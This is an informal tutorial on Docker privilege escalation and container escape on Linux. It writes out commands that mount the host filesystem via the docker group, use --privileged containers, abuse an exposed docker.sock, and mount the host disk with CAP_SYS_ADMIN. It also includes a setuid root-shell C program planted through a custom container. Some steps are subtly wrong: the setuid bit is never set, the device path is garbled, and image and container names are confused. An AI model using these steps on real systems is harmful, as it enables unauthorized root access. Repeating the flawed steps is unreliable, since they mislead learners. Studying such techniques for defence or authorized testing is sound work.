Docker priveleg escalation

1) If local user is a member of docker group on linux we can use that to abuse docker permission to escalate our privilege to root:

docker run -v /:/mnt -it example

You need to use avialbe docker container id or name instead of "example" for above command.
Above command mounts entire file system into /mnt directory and gives us root docker shell which we can use /mnt directory to read or write entire operating system.

For example in this case /etc/shadow file can be accessed as: /mnt/etc/shadow or /root directory as /mtn/root.

2) We cano also use --privileged flag to lower container security. The --privileged flag significantly lowers container security, offering unrestricted device access and bypassing several protections.

For example:

docker run --rm --privileged -it example sh

3) Above two examples requires you to already have docker containers running, but now we can learn how to abuse docker permission with creating our own container

First wirte this shell.c code:

#include 
#include 

int main() {
    setuid(0);
    system("/bin/sh");
    return 0;
}

and compile using gcc:

gcc -o shell shell.c

Second step create Dockerfile

Dockerfile:

FROM alpine:latest
COPY shellscript.sh /shellscript.sh
COPY shell /shell
RUN chmod +x /shellscript.sh

Third step create shellscript.sh file

shellscript.sh:

#!/bin/bash
cp /shell /shared/shell
chmod 755 /shared/shell

Now we need to build our container. To do that we need to place our 3 above files into 1 empty directory which we should have all 3 files (Dockerfile, shellscript.sh, shell) in our directory and issue this command to build:

docker build --rm -t test:latest .

Next we need to run conatiner by mounting /tmp directory

docker run -v /tmp/:/shared/ test:latest /bin/sh /shellscript.sh

After running the container go to /tmp directory on host and execute shell file:

cd /tmp
./shell

If all the steps followed correctly our shell code should execute with elevated privilege.

Escaping from docker container

If we land a docker shell where we inside docker container there is various possible technique where we can escape from docker shell.

Docker escape 1 - Abusing exposed docker socket

Searching exposed docker sockets:

find / -name "docker.sock" 2>/dev/null

If we find docker image:

docker run -v /:/mnt --rm -it example /bin/bash

We used another container to mount host file system into /mnt directory. Like first example it's another escape technique.

Docker escap 2 - Abusing CAP_SYS_ADMIN capability

If we have CAP_SYS_ADMIN capability we can mount disk to specific directory to access entire machine files while staying inside docker shell.

Checking capabilities of docker:

root@2225bfdee7ec:~# capsh --print | grep cap_sys_admin
Current: = cap_chown, cap_sys_module, cap_sys_chroot, cap_sys_admin, cap_setgid,cap_setuid
<-- snip -->

capsh --print revealed we have cap_sys_admin capabilitiy.

First we need to identifiy disk using lsblk

┌──(lobo㉿berserk)-[~]
└─$ lsblk
NAME        MAJ:MIN RM   SIZE RO TYPE MOUNTPOINTS
nvme0n1     259:0    0 238.5G  0 disk 
├─nvme0n1p1 259:1    0   976M  0 part /boot/efi
├─nvme0n1p2 259:2    0 225.2G  0 part /
└─nvme0n1p3 259:3    0  12.3G  0 part [SWAP]

Here we can see my disk file: /nvme0n1/nvme0n1p2 which I can mount that while staying in docker container with this command:

mount /nvme0n1/nvme0n1p2 /mnt

Other linux machines you may see different disk name like /dev/sda1, important part is you need to look at mountpoints in my case nvme0n1p2 mounted to /
